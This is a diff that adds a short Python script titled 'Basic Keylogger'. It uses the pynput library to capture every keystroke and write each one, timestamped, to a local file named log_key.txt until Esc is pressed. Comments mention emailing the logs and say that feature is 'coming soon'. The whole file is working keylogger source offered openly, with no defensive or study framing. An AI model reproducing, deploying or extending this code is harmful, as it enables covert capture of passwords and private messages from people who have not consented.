@@ -1,0 +1,29 @@
+# Basic Keylogger
+
+# Using module pynput
+import pynput
+from pynput.keyboard import Key, Listener
+import logging
+
+# For documenting the logs you can save in a text file or email them.
+# Logging the keystrokes in a text file "log_key.txt".
+log = ""
+logging.basicConfig(filename=(log + "log_key.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+# For documenting them via email(update coming soon).
+
+
+# For collecting the keystrokes
+def on_press(key):
+    logging.info(str(key))
+
+
+# For escaping the program
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+
+# Keylogger loop
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
